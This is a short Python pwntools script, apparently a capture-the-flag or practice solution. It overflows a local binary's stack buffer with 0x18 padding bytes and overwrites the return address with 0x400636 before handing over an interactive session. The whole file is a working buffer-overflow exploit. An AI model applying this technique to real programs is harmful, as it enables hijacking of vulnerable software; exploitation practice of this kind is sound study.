from pwn import *

p = process("./a.out")
print p.recvline()

p.sendline("a"*0x18 + "\x36\x06\x40\x00" + "\x00\x00\x00\x00")

p.interactive()
